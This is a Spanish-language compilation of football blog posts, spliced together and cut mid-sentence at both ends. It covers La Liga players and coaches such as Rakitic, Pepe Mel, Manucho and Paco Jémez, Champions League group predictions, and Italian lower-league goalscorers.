Claude Puel.Porque el croata entra dentro de esa categoría de jugadores a los que los técnicos tratan de dosificar bajo un estudiado plan, porque cada minuto de sus servicios puede ser decisivo. Uno de esos jugadores con los que hay que analizar con mucho detenimiento cuándo pueden bajar la guardia y dejar que su trabajo lo hagan otros. Porque Rakitic es el futbolista imprescindible del Sevilla, aquel sobre el que gravita el juego del equipo, aquel cuya dosificación es siempre cuestión de debate y análisis concienzudo. El jugador franquicia, que dirían los norteamericanos. El futbolista al que hubo que buscarle una novia sevillana al poco tiempo de su llegada a la capital hispalense para atarlo de pies y manos al Sánchez Pizjuán y que tuviese un motivo más para permanecer fiel a la hinchada sevillista.Ayer, en la víspera de su vigésimosexto cumpleaños, Ivan Rakitic no fue protagonista en la victoria de su equipo ante el Almería. No lo fue porque Emery tiene reservadas para él varias actuaciones estelares, varias misiones especiales para las que necesita de la frescura del croata. Ha alcanzado ese estatus, reservado únicamente a los escogidos, en el que sus minutos de descanso son casi tan importantes como sus minutos de servicio. Se lo ha ganado a fuerza de ser el jugador más importante, decisivo e influyente del Sevilla FC. Ese jugador bajo cuyo mando pueden, y suelen, suceder cosas. Ese jugador al que hay que cuidar y proteger como oro en paño. SEVILLA – BARCELONACharles. No se hacen tres goles todos los días. El delantero brasileño, probablemente la incorporación de mayor relumbrón realizada por este Málaga de mínimos en el pasado verano, había sembrado la sombra de la duda en sus primeros meses en La Rosaleda. Las cosas que no salen y los goles que no llegan… Hasta el sábado. Tres dianas del nueve aniquilaron a una Real Sociedad inoperante y entregada. Tres dianas voltearon una situación complicada y rompieron una racha negativa que lastraba al Málaga desde principios del curso.Michael Krohn-Dehli. No soy muy de sacar pecho a toro pasado, pero que la llegada de Krohn-Dehli al Sevilla iba a conllevar muchas tardes de alegría en Nervión era algo que se veía venir desde el primer día.El danés firmó el sábado ante el FC Barcelona una de esas actuaciones que justifican un fichaje. Asumió galones en un partido de cuajo y enjundia. Tiró de su equipo, armó a sus compañeros y lideró la victoria sevillista con un gol y el pase del segundo, creciéndose minuto a minuto. Tiene el temple y la veteranía que a veces requieren determinados partidos. Otro acierto más de la secretaría técnica del Pizjuán.Casemiro. El mediocentro brasileño parece llamado a personificar como ninguno de sus compañeros lo que supone la presencia en el banquillo del Real Madrid de Rafa Benítez. Contención, mesura, contemporización y un centro del campo de hormigón frente a determinados rivales. Quizá por eso la figura de Casemiro haya sido indirectamente estigmatizada. Alguien lo ha identificado con el fútbol tosco, pastoso y poco atractivo, pero serio y efectivo, con el que el técnico madridista parece comulgar. Sin embargo, partidos como el de anoche el Calderón demuestran que el centrocampista de Sao Paulo tiene mucho que ofrecer a su equipo. Es la aspiradora que mantiene impoluto el tapete sobre el que Modric y Kroos tiran líneas. Y no hay mucho peón de semejante perfil en Chamartín.Beñat. No ha vuelto a ser el que salió de Heliópolis con el cartel de internacional. Tampoco ha gozado de la regularidad necesaria desde su llegada vuelta a casa. Un físico justito y una preocupante tendencia a desaparecer en las segundas partes mantenían al de Igorre en una versión minimizada. Pero en su tercera temporada en San Mamés parece haberse, por fin, ganado el puesto. Es uno de los fijos de Valverde. Su presencia es vital para el Athletic, porque atempera un poco esa exagerada tendencia a caer en el juego directo a la que necesariamente empuja la presencia de Aritz Aduriz y Raúl García.Pronto comentarán por pubs de Edimburgo y Glasgow que si Celtic y Rangers siguen así, pronto su Liga será como la española. What a sad thing… No fue la última vez que el Rayo visitó el Camp Nou, pero por kafkiana y surrealista, ha resultado de las más difíciles de olvidar. Transcurría la temporada 1996-97, y seguramente, hasta los últimos años, nunca habían dispuesto Madrid y Barça de plantillas tan potentes y tan superiores al resto de los clubes de Primera. Lorenzo Sanz había dado el pistoletazo de salida con los fichajes de Mijatovic y Suker, pero su homólogo barcelonista no le anduvo a la zaga, y acabó completando una plantilla de ensueño en la que refulgían nombres como Figo, Stoichkov, Luis Enrique, Nadal, Giovanni, Popescu o un tal Pep Guardiola; a la cabeza de todos, Ronaldo en su versión extraterrestre, inalcanzable para nadie.La morrocotuda inversión de Núñez no obedecía sólo a la necesidad de equipararse al archirrival, sino también al deseo directivo de borrar la omnipresente figura de Cruyff, santo y seña del club, y despedido meses atrás frente a la opinión mayoritaria de la culerada, que lo adoraba. Reluctante a contratar otra personalidad que pudiese hacerle sombra, el president trajo en cambio a Bobby Robson, tan simpático, amable y bonachón como desconocido para el gran público –era pre-parabólica, no lo olvidemos-. El hombre tenía una carrera a sus espaldas como para empapelar medio Camp Nou y en Inglaterra ejercía de institución, pero la prensa lo trató como un abuelete medio chalado que entre chanza y chanza se cascaba sus dieciocho hoyos o se dedicaba a regañar a Amunike por no tirar a gol en los saques de banda. No importó que en su año se viera al mejor Ronaldo, al mejor Iván de la Peña o casi al mejor Figo, que a final de temporada hubiera tres copas más en la vitrina del museo, o que el equipo batiera récords de goles y por momentos resultase una máquina. Como tantas veces, lo bueno era por los jugadores y lo malo por el coach.En este ambiente enrarecido se presentó el equipo vallecano en el coliseo de la Diagonal, con mitos del infrafútbol tipo Cota, De Quintana o Guilherme formando con la zamarra rayada. El partido recordó esencialmente al final de La Gran Evasión: a cada rato se abría la puerta y un jugador del Barça tiroteaba al pobre Contreras. Primero Luis Enrique de cabeza, después Sergi de un trallazo, más tarde el inevitable Ronaldo… así hasta un 6-0 de esos que suelen celebrarse con algarabía y jolgorio. Sin embargo, esa tarde todo resultó diferente; en los escasos momentos en que el equipo no estaba celebrando un gol o su rival sacando de centro, el aire de Barcelona se llenaba de silbidos. Una protesta cósmica, extraña y definitivamente increíble, que sólo se puede explicar desde una situación muy particular, y que punteó a un equipo que sobrevivió en Liga casi hasta el final, ganó dos veces al Madrid –una para apearle de la Copa- y que no repetiría gloria europea hasta muchos años después. Silbidos condicionados e injustos, despiadados e insensibles, veleidades de ricacho que sólo se escuchan en campos donde el respetable ha probado poco la cara más amarga del fútbol. Pongan ustedes los nombres, ejemplos hay, en España y fuera. Robson salió a final de temporada como un delincuente, pero en el recuerdo, que da y quita razones, ha sobrevivido algo que lleva la etiqueta equipazo. Para el arriba firmante, uno que le haría frente sin problema a la rutilante y adorada versión azulgrana de la actualidad. Y algo tendría que ver el entrenador. Hoy toca curiosidad. Se disputaba en 1994 el octavo de final entre México y Bulgaria, un partido intenso que en el minuto 20 ya dejaba un 1-1 en el marcador, cuando el defensa americano Marcelino Bernal cae dentro de su propia portería (minuto 8 del vídeo) y se lleva por delante uno de los palos que la sostienen. Ante el estupor general, parece que la solución va a ser atar la red a una cámara que andaba por allí cerca, pero la organización demuestra su eficacia sacando otra portería de Dios sabe dónde y sustituyendo la siniestrada en cuestión de minutos; ya podía haber aprendido la organización del Real Madrid para la famosa semifinal contra el Borussia. El partido se reanudó sin novedad, el electrónico ya no se movería y pasaría México a cuartos en la rueda de penaltis. Concluimos aquí el post que comenzamos ayer sobre la jornada final de la fase de grupos de la Liga de Campeones.Grupo A. Desde el bombo supimos que una parte importante de la enjundia de esta fase se dirimiría en este grupo, clásico de la muerte. Menos esperaban la pobre prestación del Villarreal, demasiado golpeado por la venta de Cazorla, la lesión de Rossi y la cuesta abajo de Marcos Senna. Fuera ya incluso de la Europa League, a los de Garrido les queda aún ser jueces de un grupo que ha dominado con puño de hierro el Bayern, inalcanzable hasta la lesión de Schweinsteiger. Reciben al mejor Nápoles desde Maradona, un gran equipo que, sin embargo, ofrece de vez en cuando un perfil muy plano, sobre todo a domicilio. Los Cavani y compañía están clasificados si vencen en el Madrigal, y en otro caso sólo si el City no tumba en casa a los alemanes. Líderes de la Premier hasta ahora, la clasificación convertiría sin duda a los citizens en la bomba del sorteo; lo contrario sería otro fracaso de Mancini, a quien muchos consideramos el lastre que impide a su equipo instalarse desde ya en la élite europea.Pronóstico: Bayern y Manchester City.Grupo B. El grupo B es un perfecto ejemplo de cómo la Liga de Campeones puede actuar, en ciertos casos, como un bálsamo de Fierabrás. A día de hoy, el Inter es el hazmerreír del Calcio, ha largado ya a un entrenador, no juega a nada perceptible y tiene los puestos de descenso a una distancia preocupantemente corta. Sin embargo, en la gran competición, los de Ranieri ya han firmado un excelente primer puesto, y pueden contemplar desde las alturas cómo se matan los demás. Quien mejor lo tiene es el Lille del deseado Eden Hazard, al que le basta vencer en casa al Trabzonspor para meterse en octavos. La derrota local le abriría camino al sorprendente equipo turco, que ocurra lo que ocurra ha dado ya la cara a estas alturas, y el empate dejaría hueco al CSKA, siempre que los rusos ganasen en San Siro. Muy discreto hasta ahora el papel de los moscovitas en un grupo sin demasiado nivel, sobre todo considerando que en sus filas militan futbolistas como Vagner Love, Tosic, y sobre todo Alan Dzagoev, a quien parecía que el equipo se le quedaba pequeño. Quizá no sea así.Pronóstico: Inter y Lille.Grupo C. Aquí todo parece preparado para la gran sorpresa que, como tal, casi seguro que no se producirá. Tenemos al Basilea, un equipo joven, valiente y en crecimiento, con dos estupendos futbolistas en ciernes –Xhaka y Shaqiri– y que enfrentará en casa el mayor desafío de su larguísima historia. Enfrente, un dinosaurio como el Manchester, veterano de mil batallas, pero con un nivel de juego preocupante y los síntomas que aquejan a los grupos en regresión. Los suizos deben salir a morir porque sólo les vale la victoria, los ingleses podrán contemporizar ya que el empate les sirve. Desde lejos los mira el Benfica de Jorge Jesús, que ya está clasificado, y que será campeón de grupo si gana. Si empata será también campeón con empate en el otro choque, y si pierde será segundo. En cualquier caso, todo lo que no sea una victoria de las águilas –juegan contra el Otelul, el peor equipo de la competición- resulta inconcebible.Pronóstico: Benfica y Manchester United.Grupo D. Parece que Mourinho se toma en serio la honrilla de hacer el pleno en la fase de grupos, un récord que sólo han firmado cuatro equipos en la historia de la competición, y va a sacar a varios titulares en el Amsterdam Arena, icono del madridismo. Es muy probable que delante se encuentre una oposición más dura que el año pasado, primero porque Frank de Boer ha mejorado sensiblemente la prestación de Martin Jol, y segundo porque el Ajax roza la clasificación con la yema del dedo: sus cuatro Copas de Europa sólo dejarían huérfanos los octavos si pierde con el Madrid, el Olympique le gana al Dinamo de Zagreb, y la diferencia acumulada de goles de los dos partidos es de mínimo siete. Evento altamente improbable, cuya dificultad penaliza la terrible fase clasificatoria del equipo francés, que lleva más de un año en salvaje decadencia. El Dinamo, entretanto, a seguir aprendiendo, y a evitar en futuras Champions verse con un 3-0 en contra en ocho minutos, por ejemplo.Pronóstico: Real Madrid y Ajax. Quizá se trate del gol más triste de la historia de los Mundiales. Se enfrentaban la Colombia de Maturana, que a pesar de su cartel de favorita había perdido el primer partido y se jugaba el todo por el todo contra los anfitriones estadounidenses. Cerca estaba ya el final del segundo tiempo, cuando el defensa Andrés Escobar erró un despeje e introdujo el balón en su portería. El tanto posterior de Stewart selló la suerte del partido y de la selección cafetera, pero ninguna desgracia deportiva puede compararse al ultraje que recorrió el mundo entero cuando unos pistoleros desalmados asesinaron al desgraciado futbolista unas fechas después, reprochándole además su error. La cara más siniestra del fútbol. Desde que gente como Eduardo Galeano, Jorge Valdano o los periodistas de Deportes de El País mostraran en el cambio de siglo que otra información deportiva era posible, mucha gente se lanzó a juntar letras en la convicción de se podía compatibilizar desde el periodismo o la literatura la adoración incondicional al deporte rey con ambiciones perfectamente legítimas de índole cultural y/o intelectual. La onda expansiva del fenómeno asumió pronto la Red como su medio natural de proliferación, y la necesidad expresiva cristalizó en un mundo de blogs deportivos que, durante un tiempo, constituyeron la respuesta del aficionado inquieto al “embrutecimiento” que suelen proponer, en el ámbito futbolero, los medios de comunicación habituales.Esta situación, sin embargo, resultó efímera. Aparte algunos blogueros que obtuvieron un cierto reconocimiento y en general han acabado integrándose en medios más poderosos, o profesionales del medio que respaldan escritos de calidad con el prestigio de su firma, poco queda de aquellos años en que uno podía hacerse sin gran dificultad un blogroll futbolero con decenas de entradas. Un blog requería regularidad y dedicación, y el autor soñaba con una cuota de reconocimiento o al menos interactividad que raramente obtenía. La popularización de twitter acabó disparando el tiro de gracia de la mayor parte de estos blogs, ya que sus autores encontraron un medio de encontrar visibilidad en el ámbito deportivo sin la necesidad de elaborar con frecuencia un contenido de calidad. Así, podemos decir que el fenómeno blog  ha acabado experimentando –no sólo en deportes- una suerte de filtración natural. Se encuentra calidad, pero en lugares muy concretos que ya todo el mundo conoce, y algunas propuestas tan novedosas e interesantes como aisladas, léase Jot Down o Proyecto Panenka.Parecía que la popularización del matrimonio entre fútbol y literatura o periodismo serio moría en un dead end, y que el fenómeno quedaba como un triste parto de los montes. Sin embargo, una inesperada fiebre editorial ha cambiado la situación, en forma de un delicioso efecto boomerang. Si el deseo generalizado de otra información deportiva pasó de la letra impresa a la Red de modo natural, el boom de blogs y ciber-actividad en torno al fútbol ha llamado la atención de los editores sobre la existencia de un público ahí fuera que demanda leer sobre fútbol a un nivel superior al que le ofrece la prensa deportiva –aunque ambas cosas puedan ser compatibles-. El resultado de tal estimación ha venido dado por una profusión de libros de fútbol en 2011 de la que no podemos más que felicitarnos los aficionados. Si tenemos que nombrarlos todos no acabamos, y además los compañeros de La Cola de Vaca ya han dejado una buena recopilación aquí.Hablamos de una de esas raras  especies de planta  que crecen, como por arte de magia darwiniana, en las  grietas del  asfalto y donde leen grietas interpreten tacos y mucha tiza en la pizarra dibujando obstáculos.Por ello me apetece hablarles de dos de los más tozudos ejemplares que haya dado esa raza de vegetales. De Igor Protti y Dario Hübner: los dos únicos futbolistas que han sido capaces de agenciarse el título de capocannoniere en las tres principales categorías, Series A, B y C del fútbol transalpino. Ahí es nada.Por respeto a la cronología comenzaré con Dario Hübner. La imagen del Bisonte de Muggia, cuya biografía recomiendo consultar en la casa de algún autor con más gracia que yo, es en muchas mentes la del mostrenco al que la barbita  “a la D’Artagnan” le aportaba la masculinidad que a su compañero en el Brescia, Roberto Baggio, le negaba rotundamente. Por la de otros aparecerá acompañando a Robert Prosinecki en el humeante club de los amigos de la cajetilla . Otros verán al esforzado que tuvo que conformarse con asomarse a la máxima categoría a sus 30 años. Para mi mismo es un clásico de los resúmenes televisivos. Sin embargo, en Fano, en Cesena y en Piacenza evocan la memoria del rizoso celebrando el premio de máximo goleador de la categoría. En el 91 lo logró en la C con el Alma Juventus de Fano (14 goles), en el 95 con el Cesena en la B (22) y en 2001 con el Piacenza en la A (24). Velocidad y avaricia en el remate. Un mito. Olvidado por los grandes pero icono del fútbol modesto por siempre, el Bisonte colgó las botas a los 43 años y presume, en el pequeño café que regenta en la ciudad Crema, de un récord por el que tan sólo otro futbolista puede sacar pecho.Y avanzando un poco más por la senda del infrafútbol se puede avistar la figura de Igor Protti.Si hay una historia inverosímil en el calcio italiano esa es la suya. A once años vista de su debut con el Livorno, allá por la ya polvorienta 85-86, regresó a la rojísima entidad para apuntarse el capocannoniere durante dos temporadas consecutivas (embocando la friolera de 47 goles de 2000 a 2002) y abrirle las puertas de la Serie B al club amaranto por primera vez en 30 años. Si tenemos en cuenta que el Príncipe tuvo la ocurrencia de anotar el gol clave en la promoción y repetir pichichi al año siguiente en la B (23 goles) se comprende porqué junto a Lucarelli es icono indeleble, siempre con el 10 pegado al cuerpo, en el Armando Picchi. Por cierto y paradigmáticamente parece lo menos meritorio de la hazaña, el Zar tuvo tiempo de acreditar su oportunismo al más alto nivel con  un pichichi de la Serie A para aquel Bari ascensor y pre-Cassano de finales de los 90. Fueron Dario Hübner e Igor Protti, ases del infrafútbol, flores que crecieron en el asfalto. “¿Porqué nadie puede parar al siete?” apuntó María, con una precisión tan imprevista como quirúrgica en mitad del Queens Park Rangers-Coventry del pasado enero. María, les aclaro, es mi novia y seguramente la persona en el mundo a la que menos le emociona el fútbol. Como es inteligente no milita en esa legión de recalcitrantes y afectados que echan pestes sobre el asunto de la pelotita en cuanto tienen ocasión pero vaya, que ella siente por estas cosas de la pelotita lo que Peret por las mujeres. Que ni fu ni fa. Sin embargo, encajonada junto a mi en los estrechos asientos de Loftus Road, se conectó mentalmente al resto del campo y le explicó a un loco del fútbol lo que él mismo llevaba advirtiendo desde que el chaval con el siete en la camiseta  tocara la primera pelota. Así de bueno es Adel Taarabt.En enero estuvimos en Londres y pese a atender religiosamente las obligaciones del turista encontramos tiempo para ir al fútbol. Quince días antes y previa criba basada en motivos tan volátiles como la arquitectura del estadio o el color de las camisetas y otros ciertamente definitivos como el precio del asiento, compramos billetes para ver al Queens Park Rangers. Como imaginarán lo de ir al campo en Inglaterra aunque sea en segunda es una experiencia divertida hasta para el profano. Disfrutamos del paseo hasta el estadio (si van en metro recomiendo apearse en Shepherd’s Bush Market y acercarse al campo entre encamisetados locales y olor a cocina internacional antes que acceder desde la más cercana pero desangelada White City por mucho que quieran echarle un tiento a los estudios de la BBC) del R-Block infectando a todo el campo con sus canciones, abarrotado en Segunda por cierto, y de la atención al aficionado. El envoltorio ya digo fue exquisito pero, parece mentira, lo que sigo recordando es que vi jugar a Taarabt.Aquel día vimos como el enésimo nuevo Zidane ganaba el partido con dos bellezas (un gol con requiebro y chut académico a la red y un regalo con el exterior para servir en bandeja el 2-1 definitivo) pero hubiéramos disfrutado de un espectáculo similar en cualquier partido al que hubiésemos decidido asistir con el siete de por medio. Su entrenador, Neil Warnock, afirma que es el futbolista más talentoso con el que ha trabajado en treinta años y que tiene la misma calidad que Rodney Marsh, quizá el mejor en haber vestido la camiseta rayada. Y no es ninguna bravuconada. Hay tipos que necesitan de una vida para construir un vídeo apañadito y a Taarabt le basta con media hora.Beñat es el orificio por el que respira la intensidad del juego rojiblanco. Y este Beñat sí se parece más al del Betis.Alen Halilovic. Al Sporting, muy condicionado por las dificultades para reforzar su plantilla en el verano de su retorno a Primera, llegó el pasado mes de agosto un diamante en bruto. Tras un año en un Barça B de derribo, la gema croata llegaba cedido a Gijón en la búsqueda de esos minutos de calidad que sirven para filtrar y separar la mena de la ganga. En Primera y en un equipo que, a buen seguro, le iba a necesitar. El sábado en Cornellà anotó su primer gol como sportinguista y firmó una de esas actuaciones que hacen pensar que detrás de su aspecto aniñado y su desbordadísimo hype hay un futbolista de verdad. A veces pasa. Llegas al restaurante, te sientas en la mesa, miras la carta y sí, ahí lo ves, lo tienes claro. Vas a pedir ese tataki de atún rojo con salsa de cítricos y cobertura de sésamo que ya solo de leer su nombre sobre el papel estás salivando. Esto tiene que estar de muerte, piensas convencido de tu elección. Olvidas el resto de opciones, tal vez incluso más apetecibles o recomendables, porque tienes tu particular antojo. Quieres el atún y no hay más que hablar.Cuando el West Bromwich Albion decidió prescindir de los servicios de Steve Clarke a mediados del pasado mes de diciembre, desde el propio club se hizo creer que la única opción que se contemplaba en la aparentemente extensa carta de platos disponible era la de Pepe Mel. No había ojos para otro. ‘Nuestro candidato número uno‘, fue su carta de presentación ante la afición por parte de los responsables de su fichaje. Lo que puede que no detallaran en exceso es que si la elección fue precisamente la del extécnico bético, tal vez era porque se habían acabado el resto de platos del menú.Tengo la sensación, confirmada en buena medida ahora que desde el pasado lunes ya conocemos el fin de la relación entre Mel y los Baggies, de que tanto el club como el técnico se equivocaron con su elección. Que ni Pepe Mel era lo que intuían en The Hawthorns, ni el West Brom y sus peculiares circunstancias era lo que Mel realmente esperaba de ese fútbol inglés en el que tanto ansiaba probarse. Como dos desconocidos en una cita a ciegas. Muy condicionado por las urgencias y las dificultades clasificatorias (Mel cogió al equipo en el mes de enero cuando éste ocupaba la decimocuarta posición y trataba de luchar contra una tendencia preocupantemente a la baja), el bagaje de resultados del técnico madrileño al frente del que fuese su equipo durante cinco meses no arroja unos resultados precisamente brillantes: ocho derrotas, seis empates y únicamente tres victorias. Fue, eso sí, suficiente para que Pepe Mel lograra el objetivo para el que fue contratado a mitad de temporada. Con tres puntos sobre la zona de descenso, el West Brom salvó la temporada evitando el descenso de forma virtual en la penúltima jornada del campeonato. Pese a las dificultades, el objetivo estaba conseguido.Creo sinceramente que Pepe Mel se merece probar en el fútbol inglés en otro tipo de hábitat y, sobre todo, bajo otro tipo de condiciones. Que su idea de fútbol necesita de un clima menos extremo, de menor tensión en el ambiente. Fueron varios los altercados que hubo que sofocar en el vestuario baggie en los meses en que permaneció en el cargo, quizá el más sonado el de Nicolas Anelka con su polémica celebración de la ‘quenelle‘, y hubo que tragar de entrada con algunas imposiciones (a Mel le hicieron renunciar a parte de su staff técnico habitual, obligándole a contar con gente del club en su equipo). Todo ello unido, al parecer, a ciertas dificultades idiomáticas. Demasiada marejada en apenas unos meses.La salida de Pepe de The Hawthorns se ha ilustrado como una especie de ‘no eres tú, soy yo’ entre el club y el técnico. Como un acuerdo que implica lo mejor para ambas partes, en un intento de evitar seguir haciéndose daño mutuamente. Quizá haya sido la mejor manera de reconocer y admitir que tal vez el tataki de atún rojo no fuera la mejor elección de la carta.Puedes comprar camisetas del West Bromwich Albion, y de cientos de equipos más, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Mateus Manucho (Luanda, Angola, 1983) lleva tres años marchándose de Valladolid. Siempre con el cartel de transferible, con las maletas preparadas y el público con la despedida a punto. Siempre colocado en el mejor lugar del escaparate pucelano, como esperando a que algún incauto lo vea desde fuera y se atreva a entrar a preguntar por su precio. Siempre flotó sobre el aire de Zorrilla una extraña sensación de que Manucho valía más por lo que pudiese dejar en caja que por lo que realmente ofrecía sobre el césped como blanquivioleta. Como si alguien hubiese dado por hecho que su contratación fue, en su día, un monumental error y que su aporte al Real Valladolid iba a quedar limitado a una simple posibilidad de hacer un buen negocio en el mercado de traspasos. Algo absolutamente imprevisto, dado el vistoso cartel con el que aterrizó en la capital castellana.El delantero africano ha protagonizado una carrera un tanto errática desde su llegada a Europa en enero de 2008. ‘Es un delantero alto, ágil y rápido. Gracias a los contactos que mantiene Carlos Queiroz sabíamos de él desde hace medio año‘. Sir Alex Ferguson parecía tenerlo muy claro cuando, tras un breve periodo de prueba, decidió hacerle un hueco en el Manchester United. No le duraría mucho la ilusión por la novedad, sin embargo. Algunos problemas y retrasos en el procedimiento para la obtención del pertinente permiso de trabajo en Inglaterra acabaron llevándole en una cesión de media temporada al Panathinaikos. Media temporada en Old Trafford, en la que alternó diversas apariciones con el primer equipo en partidos de copa y varios partidos con el equipo reserva y de nuevo una cesión más, esta vez al vecino Hull City. Parecía evidente que Manucho jamás conseguiría triunfar en Old Trafford.Bajo la inolvidable promesa de anotar ‘entre 30 y 40 goles‘ en su primer año como blanquivioleta, Manucho aterrizó en Valladolid con la reconocida vitola de ser futbolista del Manchester United. Un ex red devil vistiendo los colores del equipo local no era algo a lo que el público de Zorrilla estuviese acostumbrado. Con ese condicionante de ‘tiene que ser bueno por narices, viene del United, lo fichó Ferguson’, Manucho sucumbió a la cruda realidad de la competición española y de lo complicado que resulta que un goleador destaque en un conjunto como el pucelano. En su primer año a orillas del Pisuerga, Manucho solo pudo firmar cinco goles. Estaba claro que no era el fichaje bomba que su origen hacía presumir.Desde su llegada a Pucela, Manucho ha pasado por diversas fases en su relación con la grada y el club. Desde la decepción inicial y las consiguientes cesiones al fútbol turco con ciego ánimo de recuperación, hasta la definitiva concienciación de que el angoleño nunca llegaría a estrella, pasando por un sinfín de infructuosos intentos de venta. Sin embargo, y una vez asumida la realidad de la situación, Manucho siempre ha terminado siendo útil para el Real Valladolid. No es un goleador espectacular, no tiene unas cifras abrumadoras, pero su participación casi siempre se resume en un importante aporte al haber vallisoletano. Complicado de defender por su corpulencia y su movilidad, Manucho condiciona el juego de un equipo que, al menos esta temporada, se ha mostrado carente de un catálogo variado de soluciones atacantes. De su sociedad con Javi Guerra dependen gran parte de las opciones de salvación blanquivioletas.Vista la situación, creo que Mateus Manucho debería ir deshaciendo esas maletas. No tiene el Valladolid muchas soluciones como él. Dice Paco Jémez que nada ni nadie va a cambiar la manera de jugar de su Rayo Vallecano. Que los pitos y las muestras de desaprobación de parte de la grada de Vallecas (las últimas el pasado domingo ante el Atleti) no pueden alterar su particular manera de concibir el juego, porque eso implicaría una considerable falta de personalidad. No nos vamos a engañar, personalidad, lo que es personalidad, Paco tiene para regalar. Es un personaje vistoso, vehemente, agradecido para el entrevistador y el cazador de ruedas de prensa. El técnico canario lleva su ideario hasta la última expresión del mismo, lo agota sin dobleces ni medias tintas. Si para él sólo existe una manera de concebir el juego, se muestra irreductible abrazándose a ella. Aunque su Rayo no levante cabeza. Aunque ocupe el penúltimo puesto en la clasificación liguera a cinco puntos de la salvación y encandene ya una preocupante racha de cuatro puntos de los últimos veinticuatro en juego. Y en Vallecas, claro, empiezan a estar mosqueados con el tema.Ya hemos debatido en este mismo espacio sobre la temeridad de la propuesta de Paco. Hay quien, no obstante, valora su osadía y su atrevimiento de jugar a pecho descubierto y buscar sin miedo a las consecuencias la portería rival. Sin ir más lejos, el pasado domingo, tras su sonada derrota ante el Atleti, Santiago Segurola comentaba que ‘le emocionaba‘ ver jugar al Rayo de Paco Jémez. La confesión del periodista bilbaíno choca radicalmente con el cada vez más extendido sentir de la grada vallecana. A Segurola le emociona el descaro y el atrevimiento, muy frecuentemente suicida, de este Rayo porque la franja le provoca los mismos sentimientos que un accidente de bicicleta en Guangzhou. No es su equipo, y no va a sufrir especialmente si termina perdiendo la categoría y hundiéndose de nuevo en el barro a partir de la temporada que viene. Vale, el Rayo de Paco es divertido cuando te dan igual los sopapos que se lleve.El club no ha acertado con sus apuestas para reforzar la plantilla del pasado verano. Y eso, cuando cuentas con una plantilla tan de mínimos como la que tiene el conjunto vallecano, supone un lastre demasiado pesado. Quizá el Rayo de la temporada pasada lograba otros resultados apoyado en el mismo estilo que ahora lo lleva directo a la condena porque contaba con otros futbolistas. Porque los Javi Fuego, Piti, Baptistao o Jordi Amat, futbolistas todos ellos que ya no están, permitían al equipo jugar de una manera más alegre. Lo que el año pasado era valentía, hoy tal vez sea temeridad. Y ahí Paco, más que una personalidad firme, lo que demuestra es poca cintura y una escasa capacidad de adaptación a las circunstancias. La verdadera medida de las cosas debe ser calibrada en unas condiciones neutras. Sin injerencias externas, sin el concurso de factores condicionantes, sin intromisiones que terminarían por alterar su correcto y debido funcionamiento. Cabe, por tal motivo, la pregunta de si este Barça inoperante y romo de final de temporada es el verdadero Barça, de si este Atlético que cae ante el Levante y tropieza en casa ante el Málaga cuando tenía el título liguero en sus manos es el auténtico Atleti de Simeone, o de si ese Real Madrid que en apenas una semana se deja sorprender por un Valencia mermadísimo en el Bernabéu, que sucumbe ante el empuje del casi desahuciado Valladolid y que, directamente, no comparece en Balaídos, es el mismo que con tanta brillantez alcanzó la final de la Champions League hace apenas un par de semanas. No.Los centrales, Cris y Boumsong, son lentos y los tiros lejanos y los balones conducidos por el centro les vienen de maravilla. Las coberturas y las jugadas en profundidad les harían más daño pero el Madrid se negó a crear, se negó a abrir el juego por las bandas. El partido fue como una de esas máquinas de pinball donde la pelota siempre va al centro y las paletas del rival la repelen, alejándolas de su arco.No sé que en medida esa necesidad de la que hablaba al principio interviene en el juego. Las eliminatorias dan vértigo, caer en el abismo es decir adiós a buena parte de la temporada. No hay misericordia ni se exige respeto a un equipo que aún debe formarse, aquí sólo se habla de la cita de mayo en el Bernabéu, de pasar o pasar, de la épica –tan caduca ya- del equipo merengue. En fin, de esas cosas que no ayudan al asentamiento de un grupo sino a la intranquilidad que generan unos objetivos irreales, desmedidos o hinchados. E insisto, no es una cuestión de capacidad, ni se deben airear las facturas de los fichajes como argumento. El Madrid puede ganar la Champions, como la ganó el Liverpool, el Milan, el Oporto o el Barcelona el año pasado. Claro que puede ganarla, está en el camino para ello, pero no está obligado a hacerlo porque la obligación en el fútbol es papel mojado. En el césped puede pasar cualquier cosa. Las portadas, en su línea de siempre, lanzan bravatas, retos, desafíos, hacen apuestas, dan marcadores aplastantes, pretenden animar a la tropa –digo yo-. Pero todos haríamos bien en disfrutar del fútbol sin más, sin pensar en mañana, sin pensar en el desembolso económico, sin pensar en esa final de Madrid que aún queda tan lejana. El Málaga ha conservado la categoría y el año que viene volverá a disfrutar de los campos de Primera. Suficiente para un equipo que lleva toda la temporada coqueteando con los puestos de descenso y cuyo fútbol no hacía albergar grandes esperanzas. La última jornada frente a un Real Madrid que se jugaba el único título al que aspiraba era la conclusión funesta para los hombres de Muñiz. Afortunadamente el partido en el Camp Nou se decidió pronto y con contundencia y el equipo de la Costa del Sol logró un meritorio empate que alarga el sueño dorado de un equipo que ha visto la amenaza de la Liga Adelante demasiado cerca.Era difícil que un equipo desmantelado mantuviera los magníficos resultados de la anterior campaña. Con Tapia fue el equipo revelación de la 08/09, jugadores como Apoño o Eliseu marcaron diferencias y el club, recién ascendido, pudo soñar con la gloria de la categoría y Europa. Esta temporada, tras la venta obligada para sanear la institución y con la ausencia de fichajes obligado por la precaria situación económica del club, al asturiano Muñiz le brindaron una larga lista de cedidos que pudieran competir con solvencia y, por qué no, repetir los éxitos del pasado. Nada más lejos de la realidad.El equipo no ha demostrado seguridad atrás ni demasiado control del juego. Sus partidos han sido correcalles inofensivos y el alto número de empates, resultados cortos y partidos dejados de ganar en los últimos instantes, ha tenido tanto peso en las visitas como en la propia Rosaleda. Hay jugadores que no han estado en todo el año, ni el delantero Forestieri, ni Stepanov, ni Albert Luque –tras acabar la temporada pasada siendo importante-, ni Edinho, ni Valdo, ni Helder Rosario… jugadores que deberían haber hecho dar un salto de calidad al equipo malagueño.Por otra parte, por el lado bueno, Obinna –intermitente pero participativo-, Caicedo –cedido por el City en diciembre y que se ha convertido en un jugador imprescindible desde su llegada- y el lateral Mtiliga han sido las mejores sorpresas en ese aluvión de incorporaciones anónimas que, en parte, han sido la gran lacra del club. Por destacar, además del nigeriano, del ecuatoriano y del danés, como motores del club están los de siempre. Jesús Gámez, Apoño, Fernando y sobre todo Duda. Jugadores con conciencia del club y verdaderos artífices de la salvación.Poca chicha para un campeonato que, en la zona baja, ha tenido mucha tensión. La apisonadora de los equipos punteros ha dejado poco lugar a la especulación en los siempre derrotados equipos modestos. El Málaga se ha salvado con sólo 37 puntos. Una seria advertencia de cara al futuro. Sólo siete partidos ganados en una liga que a punto ha estado 